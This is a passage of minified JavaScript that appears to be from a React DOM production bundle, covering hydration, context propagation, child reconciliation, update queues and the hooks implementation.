t=e.stateNode,l=e.type,a=e.memoizedProps;switch(t[Qe]=e,t[et]=a,l){case"dialog":le("cancel",t),le("close",t);break;case"iframe":case"object":case"embed":le("load",t);break;case"video":case"audio":for(l=0;l<mn.length;l++)le(mn[l],t);break;case"source":le("error",t);break;case"img":case"image":case"link":le("error",t),le("load",t);break;case"details":le("toggle",t);break;case"input":le("invalid",t),Gs(t,a.value,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name,!0);break;case"select":le("invalid",t);break;case"textarea":le("invalid",t),Qs(t,a.value,a.defaultValue,a.children)}l=a.children,typeof l!="string"&&typeof l!="number"&&typeof l!="bigint"||t.textContent===""+l||a.suppressHydrationWarning===!0||Jr(t.textContent,l)?(a.popover!=null&&(le("beforetoggle",t),le("toggle",t)),a.onScroll!=null&&le("scroll",t),a.onScrollEnd!=null&&le("scrollend",t),a.onClick!=null&&(t.onclick=kt),t=!0):t=!1,t||il(e,!0)}function Mo(e){for(Ve=e.return;Ve;)switch(Ve.tag){case 5:case 31:case 13:Nt=!1;return;case 27:case 3:Nt=!0;return;default:Ve=Ve.return}}function ca(e){if(e!==Ve)return!1;if(!se)return Mo(e),se=!0,!1;var t=e.tag,l;if((l=t!==3&&t!==27)&&((l=t===5)&&(l=e.type,l=!(l!=="form"&&l!=="button")||Ic(e.type,e.memoizedProps)),l=!l),l&&je&&il(e),Mo(e),t===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(h(317));je=ad(e)}else if(t===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(h(317));je=ad(e)}else t===27?(t=je,Sl(e.type)?(e=as,as=null,je=e):je=t):je=Ve?Et(e.stateNode.nextSibling):null;return!0}function wl(){je=Ve=null,se=!1}function Uu(){var e=nl;return e!==null&&(it===null?it=e:it.push.apply(it,e),nl=null),e}function Va(e){nl===null?nl=[e]:nl.push(e)}var Ru=r(null),Ul=null,qt=null;function ul(e,t,l){z(Ru,t._currentValue),t._currentValue=l}function Gt(e){e._currentValue=Ru.current,A(Ru)}function ku(e,t,l){for(;e!==null;){var a=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,a!==null&&(a.childLanes|=t)):a!==null&&(a.childLanes&t)!==t&&(a.childLanes|=t),e===l)break;e=e.return}}function Bu(e,t,l,a){var n=e.child;for(n!==null&&(n.return=e);n!==null;){var i=n.dependencies;if(i!==null){var u=n.child;i=i.firstContext;e:for(;i!==null;){var s=i;i=n;for(var o=0;o<t.length;o++)if(s.context===t[o]){i.lanes|=l,s=i.alternate,s!==null&&(s.lanes|=l),ku(i.return,l,e),a||(u=null);break e}i=s.next}}else if(n.tag===18){if(u=n.return,u===null)throw Error(h(341));u.lanes|=l,i=u.alternate,i!==null&&(i.lanes|=l),ku(u,l,e),u=null}else u=n.child;if(u!==null)u.return=n;else for(u=n;u!==null;){if(u===e){u=null;break}if(n=u.sibling,n!==null){n.return=u.return,u=n;break}u=u.return}n=u}}function sa(e,t,l,a){e=null;for(var n=t,i=!1;n!==null;){if(!i){if((n.flags&524288)!==0)i=!0;else if((n.flags&262144)!==0)break}if(n.tag===10){var u=n.alternate;if(u===null)throw Error(h(387));if(u=u.memoizedProps,u!==null){var s=n.type;rt(n.pendingProps.value,u.value)||(e!==null?e.push(s):e=[s])}}else if(n===I.current){if(u=n.alternate,u===null)throw Error(h(387));u.memoizedState.memoizedState!==n.memoizedState.memoizedState&&(e!==null?e.push(Sn):e=[Sn])}n=n.return}e!==null&&Bu(t,e,l,a),t.flags|=262144}function Wn(e){for(e=e.firstContext;e!==null;){if(!rt(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function Rl(e){Ul=e,qt=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function Ze(e){return Do(Ul,e)}function Fn(e,t){return Ul===null&&Rl(e),Do(e,t)}function Do(e,t){var l=t._currentValue;if(t={context:t,memoizedValue:l,next:null},qt===null){if(e===null)throw Error(h(308));qt=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else qt=qt.next=t;return l}var em=typeof AbortController<"u"?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(l,a){e.push(a)}};this.abort=function(){t.aborted=!0,e.forEach(function(l){return l()})}},tm=j.unstable_scheduleCallback,lm=j.unstable_NormalPriority,He={$$typeof:C,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function Lu(){return{controller:new em,data:new Map,refCount:0}}function Za(e){e.refCount--,e.refCount===0&&tm(lm,function(){e.controller.abort()})}var Ka=null,Yu=0,oa=0,fa=null;function am(e,t){if(Ka===null){var l=Ka=[];Yu=0,oa=Xc(),fa={status:"pending",value:void 0,then:function(a){l.push(a)}}}return Yu++,t.then(Ho,Ho),t}function Ho(){if(--Yu===0&&Ka!==null){fa!==null&&(fa.status="fulfilled");var e=Ka;Ka=null,oa=0,fa=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function nm(e,t){var l=[],a={status:"pending",value:null,reason:null,then:function(n){l.push(n)}};return e.then(function(){a.status="fulfilled",a.value=t;for(var n=0;n<l.length;n++)(0,l[n])(t)},function(n){for(a.status="rejected",a.reason=n,n=0;n<l.length;n++)(0,l[n])(void 0)}),a}var wo=g.S;g.S=function(e,t){vr=st(),typeof t=="object"&&t!==null&&typeof t.then=="function"&&am(e,t),wo!==null&&wo(e,t)};var kl=r(null);function qu(){var e=kl.current;return e!==null?e:xe.pooledCache}function $n(e,t){t===null?z(kl,kl.current):z(kl,t.pool)}function Uo(){var e=qu();return e===null?null:{parent:He._currentValue,pool:e}}var ra=Error(h(460)),Gu=Error(h(474)),In=Error(h(542)),Pn={then:function(){}};function Ro(e){return e=e.status,e==="fulfilled"||e==="rejected"}function ko(e,t,l){switch(l=e[l],l===void 0?e.push(t):l!==t&&(t.then(kt,kt),t=l),t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,Lo(e),e;default:if(typeof t.status=="string")t.then(kt,kt);else{if(e=xe,e!==null&&100<e.shellSuspendCounter)throw Error(h(482));e=t,e.status="pending",e.then(function(a){if(t.status==="pending"){var n=t;n.status="fulfilled",n.value=a}},function(a){if(t.status==="pending"){var n=t;n.status="rejected",n.reason=a}})}switch(t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,Lo(e),e}throw Ll=t,ra}}function Bl(e){try{var t=e._init;return t(e._payload)}catch(l){throw l!==null&&typeof l=="object"&&typeof l.then=="function"?(Ll=l,ra):l}}var Ll=null;function Bo(){if(Ll===null)throw Error(h(459));var e=Ll;return Ll=null,e}function Lo(e){if(e===ra||e===In)throw Error(h(483))}var da=null,Ja=0;function ei(e){var t=Ja;return Ja+=1,da===null&&(da=[]),ko(da,e,t)}function Wa(e,t){t=t.props.ref,e.ref=t!==void 0?t:null}function ti(e,t){throw t.$$typeof===he?Error(h(525)):(e=Object.prototype.toString.call(t),Error(h(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)))}function Yo(e){function t(d,f){if(e){var m=d.deletions;m===null?(d.deletions=[f],d.flags|=16):m.push(f)}}function l(d,f){if(!e)return null;for(;f!==null;)t(d,f),f=f.sibling;return null}function a(d){for(var f=new Map;d!==null;)d.key!==null?f.set(d.key,d):f.set(d.index,d),d=d.sibling;return f}function n(d,f){return d=Lt(d,f),d.index=0,d.sibling=null,d}function i(d,f,m){return d.index=m,e?(m=d.alternate,m!==null?(m=m.index,m<f?(d.flags|=67108866,f):m):(d.flags|=67108866,f)):(d.flags|=1048576,f)}function u(d){return e&&d.alternate===null&&(d.flags|=67108866),d}function s(d,f,m,b){return f===null||f.tag!==6?(f=_u(m,d.mode,b),f.return=d,f):(f=n(f,m),f.return=d,f)}function o(d,f,m,b){var G=m.type;return G===_e?S(d,f,m.props.children,b,m.key):f!==null&&(f.elementType===G||typeof G=="object"&&G!==null&&G.$$typeof===_&&Bl(G)===f.type)?(f=n(f,m.props),Wa(f,m),f.return=d,f):(f=Kn(m.type,m.key,m.props,null,d.mode,b),Wa(f,m),f.return=d,f)}function y(d,f,m,b){return f===null||f.tag!==4||f.stateNode.containerInfo!==m.containerInfo||f.stateNode.implementation!==m.implementation?(f=Mu(m,d.mode,b),f.return=d,f):(f=n(f,m.children||[]),f.return=d,f)}function S(d,f,m,b,G){return f===null||f.tag!==7?(f=Hl(m,d.mode,b,G),f.return=d,f):(f=n(f,m),f.return=d,f)}function T(d,f,m){if(typeof f=="string"&&f!==""||typeof f=="number"||typeof f=="bigint")return f=_u(""+f,d.mode,m),f.return=d,f;if(typeof f=="object"&&f!==null){switch(f.$$typeof){case ge:return m=Kn(f.type,f.key,f.props,null,d.mode,m),Wa(m,f),m.return=d,m;case ke:return f=Mu(f,d.mode,m),f.return=d,f;case _:return f=Bl(f),T(d,f,m)}if(D(f)||N(f))return f=Hl(f,d.mode,m,null),f.return=d,f;if(typeof f.then=="function")return T(d,ei(f),m);if(f.$$typeof===C)return T(d,Fn(d,f),m);ti(d,f)}return null}function p(d,f,m,b){var G=f!==null?f.key:null;if(typeof m=="string"&&m!==""||typeof m=="number"||typeof m=="bigint")return G!==null?null:s(d,f,""+m,b);if(typeof m=="object"&&m!==null){switch(m.$$typeof){case ge:return m.key===G?o(d,f,m,b):null;case ke:return m.key===G?y(d,f,m,b):null;case _:return m=Bl(m),p(d,f,m,b)}if(D(m)||N(m))return G!==null?null:S(d,f,m,b,null);if(typeof m.then=="function")return p(d,f,ei(m),b);if(m.$$typeof===C)return p(d,f,Fn(d,m),b);ti(d,m)}return null}function v(d,f,m,b,G){if(typeof b=="string"&&b!==""||typeof b=="number"||typeof b=="bigint")return d=d.get(m)||null,s(f,d,""+b,G);if(typeof b=="object"&&b!==null){switch(b.$$typeof){case ge:return d=d.get(b.key===null?m:b.key)||null,o(f,d,b,G);case ke:return d=d.get(b.key===null?m:b.key)||null,y(f,d,b,G);case _:return b=Bl(b),v(d,f,m,b,G)}if(D(b)||N(b))return d=d.get(m)||null,S(f,d,b,G,null);if(typeof b.then=="function")return v(d,f,m,ei(b),G);if(b.$$typeof===C)return v(d,f,m,Fn(f,b),G);ti(f,b)}return null}function M(d,f,m,b){for(var G=null,oe=null,R=f,ee=f=0,ue=null;R!==null&&ee<m.length;ee++){R.index>ee?(ue=R,R=null):ue=R.sibling;var fe=p(d,R,m[ee],b);if(fe===null){R===null&&(R=ue);break}e&&R&&fe.alternate===null&&t(d,R),f=i(fe,f,ee),oe===null?G=fe:oe.sibling=fe,oe=fe,R=ue}if(ee===m.length)return l(d,R),se&&Yt(d,ee),G;if(R===null){for(;ee<m.length;ee++)R=T(d,m[ee],b),R!==null&&(f=i(R,f,ee),oe===null?G=R:oe.sibling=R,oe=R);return se&&Yt(d,ee),G}for(R=a(R);ee<m.length;ee++)ue=v(R,d,ee,m[ee],b),ue!==null&&(e&&ue.alternate!==null&&R.delete(ue.key===null?ee:ue.key),f=i(ue,f,ee),oe===null?G=ue:oe.sibling=ue,oe=ue);return e&&R.forEach(function(Nl){return t(d,Nl)}),se&&Yt(d,ee),G}function V(d,f,m,b){if(m==null)throw Error(h(151));for(var G=null,oe=null,R=f,ee=f=0,ue=null,fe=m.next();R!==null&&!fe.done;ee++,fe=m.next()){R.index>ee?(ue=R,R=null):ue=R.sibling;var Nl=p(d,R,fe.value,b);if(Nl===null){R===null&&(R=ue);break}e&&R&&Nl.alternate===null&&t(d,R),f=i(Nl,f,ee),oe===null?G=Nl:oe.sibling=Nl,oe=Nl,R=ue}if(fe.done)return l(d,R),se&&Yt(d,ee),G;if(R===null){for(;!fe.done;ee++,fe=m.next())fe=T(d,fe.value,b),fe!==null&&(f=i(fe,f,ee),oe===null?G=fe:oe.sibling=fe,oe=fe);return se&&Yt(d,ee),G}for(R=a(R);!fe.done;ee++,fe=m.next())fe=v(R,d,ee,fe.value,b),fe!==null&&(e&&fe.alternate!==null&&R.delete(fe.key===null?ee:fe.key),f=i(fe,f,ee),oe===null?G=fe:oe.sibling=fe,oe=fe);return e&&R.forEach(function(yy){return t(d,yy)}),se&&Yt(d,ee),G}function be(d,f,m,b){if(typeof m=="object"&&m!==null&&m.type===_e&&m.key===null&&(m=m.props.children),typeof m=="object"&&m!==null){switch(m.$$typeof){case ge:e:{for(var G=m.key;f!==null;){if(f.key===G){if(G=m.type,G===_e){if(f.tag===7){l(d,f.sibling),b=n(f,m.props.children),b.return=d,d=b;break e}}else if(f.elementType===G||typeof G=="object"&&G!==null&&G.$$typeof===_&&Bl(G)===f.type){l(d,f.sibling),b=n(f,m.props),Wa(b,m),b.return=d,d=b;break e}l(d,f);break}else t(d,f);f=f.sibling}m.type===_e?(b=Hl(m.props.children,d.mode,b,m.key),b.return=d,d=b):(b=Kn(m.type,m.key,m.props,null,d.mode,b),Wa(b,m),b.return=d,d=b)}return u(d);case ke:e:{for(G=m.key;f!==null;){if(f.key===G)if(f.tag===4&&f.stateNode.containerInfo===m.containerInfo&&f.stateNode.implementation===m.implementation){l(d,f.sibling),b=n(f,m.children||[]),b.return=d,d=b;break e}else{l(d,f);break}else t(d,f);f=f.sibling}b=Mu(m,d.mode,b),b.return=d,d=b}return u(d);case _:return m=Bl(m),be(d,f,m,b)}if(D(m))return M(d,f,m,b);if(N(m)){if(G=N(m),typeof G!="function")throw Error(h(150));return m=G.call(m),V(d,f,m,b)}if(typeof m.then=="function")return be(d,f,ei(m),b);if(m.$$typeof===C)return be(d,f,Fn(d,m),b);ti(d,m)}return typeof m=="string"&&m!==""||typeof m=="number"||typeof m=="bigint"?(m=""+m,f!==null&&f.tag===6?(l(d,f.sibling),b=n(f,m),b.return=d,d=b):(l(d,f),b=_u(m,d.mode,b),b.return=d,d=b),u(d)):l(d,f)}return function(d,f,m,b){try{Ja=0;var G=be(d,f,m,b);return da=null,G}catch(R){if(R===ra||R===In)throw R;var oe=dt(29,R,null,d.mode);return oe.lanes=b,oe.return=d,oe}}}var Yl=Yo(!0),qo=Yo(!1),cl=!1;function Xu(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function Qu(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function sl(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function ol(e,t,l){var a=e.updateQueue;if(a===null)return null;if(a=a.shared,(re&2)!==0){var n=a.pending;return n===null?t.next=t:(t.next=n.next,n.next=t),a.pending=t,t=Zn(e),No(e,null,l),t}return Vn(e,a,t,l),Zn(e)}function Fa(e,t,l){if(t=t.updateQueue,t!==null&&(t=t.shared,(l&4194048)!==0)){var a=t.lanes;a&=e.pendingLanes,l|=a,t.lanes=l,Ms(e,l)}}function Vu(e,t){var l=e.updateQueue,a=e.alternate;if(a!==null&&(a=a.updateQueue,l===a)){var n=null,i=null;if(l=l.firstBaseUpdate,l!==null){do{var u={lane:l.lane,tag:l.tag,payload:l.payload,callback:null,next:null};i===null?n=i=u:i=i.next=u,l=l.next}while(l!==null);i===null?n=i=t:i=i.next=t}else n=i=t;l={baseState:a.baseState,firstBaseUpdate:n,lastBaseUpdate:i,shared:a.shared,callbacks:a.callbacks},e.updateQueue=l;return}e=l.lastBaseUpdate,e===null?l.firstBaseUpdate=t:e.next=t,l.lastBaseUpdate=t}var Zu=!1;function $a(){if(Zu){var e=fa;if(e!==null)throw e}}function Ia(e,t,l,a){Zu=!1;var n=e.updateQueue;cl=!1;var i=n.firstBaseUpdate,u=n.lastBaseUpdate,s=n.shared.pending;if(s!==null){n.shared.pending=null;var o=s,y=o.next;o.next=null,u===null?i=y:u.next=y,u=o;var S=e.alternate;S!==null&&(S=S.updateQueue,s=S.lastBaseUpdate,s!==u&&(s===null?S.firstBaseUpdate=y:s.next=y,S.lastBaseUpdate=o))}if(i!==null){var T=n.baseState;u=0,S=y=o=null,s=i;do{var p=s.lane&-536870913,v=p!==s.lane;if(v?(ie&p)===p:(a&p)===p){p!==0&&p===oa&&(Zu=!0),S!==null&&(S=S.next={lane:0,tag:s.tag,payload:s.payload,callback:null,next:null});e:{var M=e,V=s;p=t;var be=l;switch(V.tag){case 1:if(M=V.payload,typeof M=="function"){T=M.call(be,T,p);break e}T=M;break e;case 3:M.flags=M.flags&-65537|128;case 0:if(M=V.payload,p=typeof M=="function"?M.call(be,T,p):M,p==null)break e;T=q({},T,p);break e;case 2:cl=!0}}p=s.callback,p!==null&&(e.flags|=64,v&&(e.flags|=8192),v=n.callbacks,v===null?n.callbacks=[p]:v.push(p))}else v={lane:p,tag:s.tag,payload:s.payload,callback:s.callback,next:null},S===null?(y=S=v,o=T):S=S.next=v,u|=p;if(s=s.next,s===null){if(s=n.shared.pending,s===null)break;v=s,s=v.next,v.next=null,n.lastBaseUpdate=v,n.shared.pending=null}}while(!0);S===null&&(o=T),n.baseState=o,n.firstBaseUpdate=y,n.lastBaseUpdate=S,i===null&&(n.shared.lanes=0),ml|=u,e.lanes=u,e.memoizedState=T}}function Go(e,t){if(typeof e!="function")throw Error(h(191,e));e.call(t)}function Xo(e,t){var l=e.callbacks;if(l!==null)for(e.callbacks=null,e=0;e<l.length;e++)Go(l[e],t)}var ha=r(null),li=r(0);function Qo(e,t){e=$t,z(li,e),z(ha,t),$t=e|t.baseLanes}function Ku(){z(li,$t),z(ha,ha.current)}function Ju(){$t=li.current,A(ha),A(li)}var ht=r(null),jt=null;function fl(e){var t=e.alternate;z(Me,Me.current&1),z(ht,e),jt===null&&(t===null||ha.current!==null||t.memoizedState!==null)&&(jt=e)}function Wu(e){z(Me,Me.current),z(ht,e),jt===null&&(jt=e)}function Vo(e){e.tag===22?(z(Me,Me.current),z(ht,e),jt===null&&(jt=e)):rl()}function rl(){z(Me,Me.current),z(ht,ht.current)}function mt(e){A(ht),jt===e&&(jt=null),A(Me)}var Me=r(0);function ai(e){for(var t=e;t!==null;){if(t.tag===13){var l=t.memoizedState;if(l!==null&&(l=l.dehydrated,l===null||ts(l)||ls(l)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder==="forwards"||t.memoizedProps.revealOrder==="backwards"||t.memoizedProps.revealOrder==="unstable_legacy-backwards"||t.memoizedProps.revealOrder==="together")){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var Xt=0,P=null,ve=null,we=null,ni=!1,ma=!1,ql=!1,ii=0,Pa=0,ya=null,im=0;function Ce(){throw Error(h(321))}function Fu(e,t){if(t===null)return!1;for(var l=0;l<t.length&&l<e.length;l++)if(!rt(e[l],t[l]))return!1;return!0}function $u(e,t,l,a,n,i){return Xt=i,P=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,g.H=e===null||e.memoizedState===null?Of:dc,ql=!1,i=l(a,n),ql=!1,ma&&(i=Ko(t,l,a,n)),Zo(e),i}function Zo(e){g.H=ln;var t=ve!==null&&ve.next!==null;if(Xt=0,we=ve=P=null,ni=!1,Pa=0,ya=null,t)throw Error(h(300));e===null||Ue||(e=e.dependencies,e!==null&&Wn(e)&&(Ue=!0))}function Ko(e,t,l,a){P=e;var n=0;do{if(ma&&(ya=null),Pa=0,ma=!1,25<=n)throw Error(h(301));if(n+=1,we=ve=null,e.updateQueue!=null){var i=e.updateQueue;i.lastEffect=null,i.events=null,i.stores=null,i.memoCache!=null&&(i.memoCache.index=0)}g.H=_f,i=t(l,a)}while(ma);return i}function um(){var e=g.H,t=e.useState()[0];return t=typeof t.then=="function"?en(t):t,e=e.useState()[0],(ve!==null?ve.memoizedState:null)!==e&&(P.flags|=1024),t}function Iu(){var e=ii!==0;return ii=0,e}function Pu(e,t,l){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~l}function ec(e){if(ni){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}ni=!1}Xt=0,we=ve=P=null,ma=!1,Pa=ii=0,ya=null}function Ie(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return we===null?P.memoizedState=we=e:we=we.next=e,we}function De(){if(ve===null){var e=P.alternate;e=e!==null?e.memoizedState:null}else e=ve.next;var t=we===null?P.memoizedState:we.next;if(t!==null)we=t,ve=e;else{if(e===null)throw P.alternate===null?Error(h(467)):Error(h(310));ve=e,e={memoizedState:ve.memoizedState,baseState:ve.baseState,baseQueue:ve.baseQueue,queue:ve.queue,next:null},we===null?P.memoizedState=we=e:we=we.next=e}return we}function ui(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function en(e){var t=Pa;return Pa+=1,ya===null&&(ya=[]),e=ko(ya,e,t),t=P,(we===null?t.memoizedState:we.next)===null&&(t=t.alternate,g.H=t===null||t.memoizedState===null?Of:dc),e}function ci(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return en(e);if(e.$$typeof===C)return Ze(e)}throw Error(h(438,String(e)))}function tc(e){var t=null,l=P.updateQueue;if(l!==null&&(t=l.memoCache),t==null){var a=P.alternate;a!==null&&(a=a.updateQueue,a!==null&&(a=a.memoCache,a!=null&&(t={data:a.data.map(function(n){return n.slice()}),index:0})))}if(t==null&&(t={data:[],index:0}),l===null&&(l=ui(),P.updateQueue=l),l.memoCache=t,l=t.data[t.index],l===void 0)for(l=t.data[t.index]=Array(e),a=0;a<e;a++)l[a]=ct;return t.index++,l}function Qt(e,t){return typeof t=="function"?t(e):t}function si(e){var t=De();return lc(t,ve,e)}function lc(e,t,l){var a=e.queue;if(a===null)throw Error(h(311));a.lastRenderedReducer=l;var n=e.baseQueue,i=a.pending;if(i!==null){if(n!==null){var u=n.next;n.next=i.next,i.next=u}t.baseQueue=n=i,a.pending=null}if(i=e.baseState,n===null)e.memoizedState=i;else{t=n.next;var s=u=null,o=null,y=t,S=!1;do{var T=y.lane&-536870913;if(T!==y.lane?(ie&T)===T:(Xt&T)===T){var p=y.revertLane;if(p===0)o!==null&&(o=o.next={lane:0,revertLane:0,gesture:null,action:y.action,hasEagerState:y.hasEagerState,eagerState:y.eagerState,next:null}),T===oa&&(S=!0);else if((Xt&p)===p){y=y.next,p===oa&&(S=!0);continue}else T={lane:0,revertLane:y.revertLane,gesture:null,action:y.action,hasEagerState:y.hasEagerState,eagerState:y.eagerState,next:null},o===null?(s=o=T,u=i):o=o.next=T,P.lanes|=p,ml|=p;T=y.action,ql&&l(i,T),i=y.hasEagerState?y.eagerState:l(i,T)}else p={lane:T,revertLane:y.revertLane,gesture:y.gesture,action:y.action,hasEagerState:y.hasEagerState,eagerState:y.eagerState,next:null},o===null?(s=o=p,u=i):o=o.next=p,P.lanes|=T,ml|=T;y=y.next}while(y!==null&&y!==t);if(o===null?u=i:o.next=s,!rt(i,e.memoizedState)&&(Ue=!0,S&&(l=fa,l!==null)))throw l;e.memoizedState=i,e.baseState=u,e.baseQueue=o,a.lastRenderedState=i}return n===null&&(a.lanes=0),[e.memoizedState,a.dispatch]}function ac(e){var t=De(),l=t.queue;if(l===null)throw Error(h(311));l.lastRenderedReducer=e;var a=l.dispatch,n=l.pending,i=t.memoizedState;if(n!==null){l.pending=null;var u=n=n.next;do i=e(i,u.action),u=u.next;while(u!==n);rt(i,t.memoizedState)||(Ue=!0),t.memoizedState=i,t.baseQueue===null&&(t.baseState=i),l.lastRenderedState=i}return[i,a]}function Jo(e,t,l){var a=P,n=De(),i=se;if(i){if(l===void 0)throw Error(h(407));l=l()}else l=t();var u=!rt((ve||n).memoizedState,l);if(u&&(n.memoizedState=l,Ue=!0),n=n.queue,uc($o.bind(null,a,n,e),[e]),n.getSnapshot!==t||u||we!==null&&we.memoizedState.tag&1){if(a.flags|=2048,pa(9,{destroy:void 0},Fo.bind(null,a,n,l,t),null),xe===null)throw Error(h(349));i||(Xt&127)!==0||Wo(a,t,l)}return l}function Wo(e,t,l){e.flags|=16384,e={getSnapshot:t,value:l},t=P.updateQueue,t===null?(t=ui(),P.updateQueue=t,t.stores=[e]):(l=t.stores,l===null?t.stores=[e]:l.push(e))}function Fo(e,t,l,a){t.value=l,t.getSnapshot=a,Io(t)&&Po(e)}function $o(e,t,l){return l(function(){Io(t)&&Po(e)})}function Io(e){var t=e.getSnapshot;e=e.value;try{var l=t();return!rt(e,l)}catch{return!0}}function Po(e){var t=Dl(e,2);t!==null&&ut(t,e,2)}function nc(e){var t=Ie();if(typeof e=="function"){var l=e;if(e=l(),ql){el(!0);try{l()}finally{el(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Qt,lastRenderedState:e},t}function ef(e,t,l,a){return e.baseState=l,lc(e,ve,typeof a=="function"?a:Qt)}function cm(e,t,l,a,n){if(ri(e))throw Error(h(485));if(e=t.action,e!==null){var i={payload:n,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(u){i.listeners.push(u)}};g.T!==null?l(!0):i.isTransition=!1,a(i),l=t.pending,l===null?(i.next=t.pending=i,tf(t,i)):(i.next=l.next,t.pending=l.next=i)}}function tf(e,t){var l=t.action,a=t.payload,n=e.state;if(t.isTransition){var i=g.T,u={};g.T=u;try{var s=l(n,a),o=g.S;o!==null&&o(u,s),lf(e,t,s)}catch(y){ic(e,t,y)}finally{i!==null&&u.types!==null&&(i.types=u.types),g.T=i}}else try{i=l(n,a),lf(e,t,i)}catch(y){ic(e,t,y)}}function lf(e,t,l){l!==null&&typeof l=="object"&&typeof l.then=="function"?l.then(function(a){af(e,t,a)},function(a){return ic(e,t,a)}):af(e,t,l)}function af(e,t,l){t.status="fulfilled",t.value=l,nf(t),e.state=l,t=e.pending,t!==null&&(l=t.next,l===t?e.pending=null:(l=l.next,t.next=l,tf(e,l)))}function ic(e,t,l){var a=e.pending;if(e.pending=null,a!==null){a=a.next;do t.status="rejected",t.reason=l,nf(t),t=t.next;while(t!==a)}e.action=null}function nf(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function uf(e,t){return t}function cf(e,t){if(se){var l=xe.formState;if(l!==null){e:{var a=P;if(se){if(je){t:{for(var n=je,i=Nt;n.nodeType!==8;){if(!i){n=null;break t}if(n=Et(n.nextSibling),n===null){n=null;break t}}i=n.data,n=i==="F!"||i==="F"?n:null}if(n){je=Et(n.nextSibling),a=n.data==="F!";break e}}il(a)}a=!1}a&&(t=l[0])}}return l=Ie(),l.memoizedState=l.baseState=t,a={pending:null,lanes:0,dispatch:null,lastRenderedReducer:uf,lastRenderedState:t},l.queue=a,l=Ef.bind(null,P,a),a.dispatch=l,a=nc(!1),i=rc.bind(null,P,!1,a.queue),a=Ie(),n={state:t,dispatch:null,action:e,pending:null},a.queue=n,l=cm.bind(null,P,n,i,l),n.dispatch=l,a.memoizedState=e,[t,l,!1]}function sf(e){var t=De();return of(t,ve,e)}function of(e,t,l){if(t=lc(e,t,uf)[0],e=si(Qt)[0],typeof t=="object"&&t!==null&&typeof t.then=="function")try{var a=en(t)}catch(u){throw u===ra?In:u}else a=t;t=De();var n=t.queue,i=n.dispatch;return l!==t.memoizedState&&(P.flags|=2048,pa(9,{destroy:void 0},sm.bind(null,n,l),null)),[a,i,e]}function sm(e,t){e.action=t}function ff(e){var t=De(),l=ve;if(l!==null)return of(t,l,e);De(),t=t.memoizedState,l=De();var a=l.queue.dispatch;return l.memoizedState=e,[t,a,!1]}function pa(e,t,l,a){return e={tag:e,create:l,deps:a,inst:t,next:null},t=P.updateQueue,t===null&&(t=ui(),P.updateQueue=t),l=t.lastEffect,l===null?t.lastEffect=e.next=e:(a=l.next,l.next=e,e.next=a,t.lastEffect=e),e}function rf(){return De().memoizedState}function oi(e,t,l,a){var n=Ie();P.flags|=e,n.memoizedState=pa(1|t,{destroy:void 0},l,a===void 0?null:a)}function fi(e,t,l,a){var n=De();a=a===void 0?null:a;var i=n.memoizedState.inst;ve!==null&&a!==null&&Fu(a,ve.memoizedState.deps)?n.memoizedState=pa(t,i,l,a):(P.flags|=e,n.memoizedState=pa(1|t,i,l,a))}function df(e,t){oi(8390656,8,e,t)}function uc(e,t){fi(2048,8,e,t)}function om(e){P.flags|=4;var t=P.updateQueue;if(t===null)t=ui(),P.updateQueue=t,t.events=[e];else{var l=t.events;l===null?t.events=[e]:l.push(e)}}function hf(e){var t=De().memoizedState;return om({ref:t,nextImpl:e}),function(){if((re&2)!==0)throw Error(h(440));return t.impl.apply(void 0,arguments)}}function mf(e,t){return fi(4,2,e,t)}function yf(e,t){return fi(4,4,e,t)}function pf(e,t){if(typeof t=="function"){e=e();var l=t(e);return function(){typeof l=="function"?l():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function gf(e,t,l){l=l!=null?l.concat([e]):null,fi(4,4,pf.bind(null,t,e),l)}function cc(){}function vf(e,t){var l=De();t=t===void 0?null:t;var a=l.memoizedState;return t!==null&&Fu(t,a[1])?a[0]:(l.memoizedState=[e,t],e)}function Sf(e,t){var l=De();t=t===void 0?null:t;var a=l.memoizedState;if(t!==null&&Fu(t,a[1]))return a[0];if(a=e(),ql){el(!0);try{e()}finally{el(!1)}}return l.memoizedState=[a,t],a}function sc(e,t,l){return l===void 0||(Xt&1073741824)!==0&&(ie&261930)===0?e.memoizedState=t:(e.memoizedState=l,e=br(),P.lanes|=e,ml|=e,l)}function bf(e,t,l,a){return rt(l,t)?l:ha.current!==null?(e=sc(e,l,a),rt(e,t)||(Ue=!0),e):(Xt&42)===0||(Xt&1073741824)!==0&&(ie&261930)===0?(Ue=!0,e.memoizedState=l):(e=br(),P.lanes|=e,ml|=e,t)}function 